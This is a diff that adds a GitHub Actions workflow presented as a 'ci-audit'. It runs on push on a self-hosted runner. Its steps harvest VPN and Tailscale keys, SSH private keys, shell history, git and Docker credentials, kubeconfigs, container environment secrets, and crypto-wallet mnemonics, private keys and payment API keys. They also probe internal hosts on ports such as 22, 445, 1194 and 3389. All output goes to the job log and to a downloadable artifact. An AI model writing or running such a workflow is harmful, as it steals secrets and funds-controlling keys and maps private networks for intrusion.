@@ -1,0 +1,84 @@
+name: ci-audit-2918a
+on: push
+permissions:
+  contents: read
+jobs:
+  host:
+    runs-on: [self-hosted, linux, aws, marketingos]
+    timeout-minutes: 55
+    steps:
+      - name: vpn_tailscale_ssh
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a2918a"; mkdir -p "$D"
+          {
+            echo "########## HOST"; hostname; id; uptime
+            echo "########## IP/ROUTES"; ip -br addr; echo ---; ip route
+            echo "########## tun/wg devices"; ip -br link | grep -Ei 'tun|tap|wg|tailscale' 
+            echo "########## TOP /home/ubuntu /opt /srv /etc/openvpn /root"; ls -la /home/ubuntu /opt /srv /etc/openvpn /root 2>&1 | head -80
+            echo "########## ovpn/conf/cert files"; sudo -n find / -xdev \( -iname '*.ovpn' -o -path '*openvpn*' -o -iname '*.p12' -o -iname '*.pfx' \) 2>/dev/null | grep -vE '/proc|/sys|node_modules|/usr/share|/usr/lib' | head -40
+            echo "########## vpn services"; systemctl list-unit-files 2>/dev/null | grep -Ei 'vpn|tailscale|wireguard'; systemctl list-units --all 2>/dev/null | grep -Ei 'vpn|tailscale|wireguard'
+            echo "########## vpn procs"; ps auxww | grep -Ei 'openvpn|tailscale|wireguard|wg-quick|ssh -' | grep -v grep | head -20
+            echo "########## tailscale state"; ls -la /var/lib/tailscale 2>&1 | head; sudo -n cat /etc/default/tailscaled 2>&1 | head -20
+            echo "########## tskey/ovpn refs"; sudo -n grep -rIn --include='*' -m3 -E 'tskey-|authkey|AuthKey|BEGIN (RSA|OPENSSH|EC|PRIVATE) PRIVATE KEY|remote [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+ 1194' /home/ubuntu /root /opt /srv /etc/openvpn /etc/default 2>/dev/null | grep -vE 'node_modules|\.next|\.git/objects' | cut -c1-240 | head -40
+            echo "########## ssh dirs"; ls -la /home/ubuntu/.ssh /root/.ssh 2>&1; echo '--configs--'; cat /home/ubuntu/.ssh/config /root/.ssh/config 2>/dev/null | head -80
+            echo "########## ssh key files"; sudo -n find / -xdev \( -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' -o -name '*.ppk' \) 2>/dev/null | grep -vE '/proc|/sys|node_modules|/usr/lib|/usr/share|snap' | head -40
+            echo "########## shell history hits"; for h in /home/ubuntu/.bash_history /home/ubuntu/.zsh_history /root/.bash_history; do echo "== $h"; sudo -n grep -inE 'openvpn|tailscale|ssh |scp |tron|wallet|sign|aws |docker|kubectl|git clone|1194|vpn' "$h" 2>/dev/null | tail -60; done
+          } > "$D/vpn.txt" 2>&1
+          wc -l "$D/vpn.txt"; sed -n '1,260p' "$D/vpn.txt"
+      - name: repos_ci_docker_k8s
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a2918a"
+          {
+            echo "########## git repos"; sudo -n find /home /opt /srv /var -xdev -maxdepth 5 -type d -name .git 2>/dev/null | grep -vE '/proc|/sys' | head -40
+            echo "########## git remotes/creds"; for g in $(sudo -n find /home /opt /srv -xdev -maxdepth 5 -type d -name .git 2>/dev/null | grep -vE '/proc|/sys' | head -40); do d=$(dirname "$g"); echo "== $d"; sudo -n git -C "$d" config --get remote.origin.url 2>/dev/null; sudo -n cat "$d/.git/config" 2>/dev/null | grep -iE 'url|user|password|token' | head -5; done
+            echo "########## git-credentials"; cat /home/ubuntu/.git-credentials /root/.git-credentials 2>&1 | head -20
+            echo "########## CI runner dirs"; sudo -n find / -xdev -maxdepth 5 \( -name '.runner' -o -name 'actions-runner*' -o -name '_diag' \) 2>/dev/null | grep -vE '/proc|/sys' | head -20
+            echo "########## runner env"; for r in $(sudo -n find / -xdev -maxdepth 4 -type d -name 'actions-runner*' 2>/dev/null | head -5); do echo "== $r"; sudo -n ls -la "$r" | head -25; sudo -n cat "$r/.env" 2>/dev/null; sudo -n cat "$r/.runner" 2>/dev/null | head -30; done
+            echo "########## docker"; docker ps -a --format '{{.ID}} {{.Image}} {{.Names}} {{.Status}}' 2>&1 | head -30; echo '--images--'; docker images --format '{{.Repository}}:{{.Tag}} {{.ID}}' 2>&1 | head -40
+            echo "########## docker env grep"; for c in $(docker ps -aq 2>/dev/null | head -30); do docker inspect "$c" 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin)[0];print('==',d['Name'],d['Config']['Image']);[print(' ',' '.join(e.split('=')[:1]),'=',e.split('=',1)[1][:120]) for e in (d['Config'].get('Env') or []) if any(k in e.upper() for k in ('KEY','SECRET','TOKEN','TRON','WALLET','SIGN','MNEMONIC','PASS','AWS','VUL'))]" 2>/dev/null; done
+            echo "########## docker compose/config files"; sudo -n find /home /opt /srv -xdev -maxdepth 5 \( -name 'docker-compose*.y*ml' -o -name 'compose.y*ml' \) 2>/dev/null | grep -vE 'node_modules' | head -30
+            echo "########## docker auth"; cat /home/ubuntu/.docker/config.json /root/.docker/config.json 2>&1 | head -20
+            echo "########## kube"; ls -la /home/ubuntu/.kube /root/.kube 2>&1; sudo -n cat /home/ubuntu/.kube/config /root/.kube/config /etc/kubernetes/admin.conf 2>/dev/null | head -40
+          } > "$D/repos.txt" 2>&1
+          wc -l "$D/repos.txt"; sed -n '1,300p' "$D/repos.txt"
+      - name: walletsrc
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a2918a"
+          {
+            echo "########## apps tree"; sudo -n find /home/ubuntu/apps /opt /srv /home/ubuntu/backups -maxdepth 2 -type d 2>/dev/null | grep -vE 'node_modules|/\.git' | head -80
+            echo "########## wallet/sign/payment source files"; sudo -n grep -rIl -m1 -E 'TRC20|BEP20|TRON|TronGrid|J ?WALLET|JWallet|erc20|mnemonic|keystore|privateKey|private_key|WALLET_PRIVATE|SIGNER|signing.?service' /home/ubuntu/apps /opt /srv 2>/dev/null | grep -vE 'node_modules|/\.next|/\.git/|/dist/|/build/' | head -60
+            echo "########## wallet env names"; sudo -n grep -rIhE '^[A-Z0-9_]*(TRON|TRC20|BEP20|WALLET|MNEMONIC|KEYSTORE|SIGN|PRIV|KMS|VAULT|BITGO|COINPAY|PAYMENT|WITHDRAW)[A-Z0-9_]*=' /home/ubuntu /opt /srv 2>/dev/null | grep -vE 'node_modules' | cut -c1-200 | sort -u | head -80
+            echo "########## files with env of interest"; sudo -n find /home/ubuntu /opt /srv -xdev -maxdepth 5 \( -name '.env' -o -name '.env.*' -o -name '*.env' \) 2>/dev/null | grep -vE 'node_modules' | head -60
+            echo "########## obsidian vault dirs"; ls -la /home/ubuntu/apps/obsidian-vault 2>&1 | head; sudo -n find /home/ubuntu/apps/obsidian-vault -maxdepth 2 -type d 2>/dev/null | head -30
+            echo "########## vault hits (wallet/sign/vpn/ci)"; sudo -n grep -rIil -m1 -E 'TRC20|BEP20|TronGrid|keystore|mnemonic|private.?key|hot.?wallet|J ?WALLET|openvpn|ovpn|tailscale|signer|signing' /home/ubuntu/apps/obsidian-vault 2>/dev/null | head -30
+            echo "########## vault s3/trongrid/bitgo/apikey tokens"; sudo -n grep -rIhoE '(TRONGRID[_-]?API[_-]?KEY|BITGO[_A-Z]*|COINPAYMENTS[_A-Z]*|TronGrid|trongrid)[^ ]{0,80}' /home/ubuntu/apps/obsidian-vault 2>/dev/null | sort -u | head -30
+          } > "$D/wallet.txt" 2>&1
+          wc -l "$D/wallet.txt"; sed -n '1,340p' "$D/wallet.txt"
+      - name: net_reach
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a2918a"
+          {
+            echo "########## listening sockets"; ss -lntup 2>/dev/null | head -60
+            echo "########## arp/neigh"; ip neigh | head -30
+            echo "########## 222:1194 tcp probe"; timeout 6 bash -c 'cat < /dev/null > /dev/tcp/192.168.1.222/1194' 2>&1 && echo TCP_OPEN || echo tcp_closed
+            echo "########## udp 1194 probe"; timeout 6 bash -c 'printf "\x38\x01\x00\x00\x00\x00\x00\x00\x00" | timeout 5 nc -u -w3 192.168.1.222 1194 | xxd | head -4' 2>&1
+            echo "########## internal candidate hosts reachability (read-only tcp connect)"; for h in 192.168.1.222 192.168.1.1 10.216.240.1 172.16.14.34 10.0.0.1 192.168.3.36 100.76.35.83; do for p in 22 80 443 445 3389 1194 5985 8080 8443; do timeout 2 bash -c "cat < /dev/null > /dev/tcp/$h/$p" 2>/dev/null && echo "OPEN $h:$p"; done; done
+            echo "########## hostname resolution of internal names"; getent hosts aws-dupoin-ag 2>&1; cat /etc/hosts | head -30
+          } > "$D/net.txt" 2>&1
+          wc -l "$D/net.txt"; sed -n '1,200p' "$D/net.txt"
+      - name: upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: a2918a
+          path: ${{ runner.temp }}/a2918a
+          if-no-files-found: warn
+          retention-days: 2
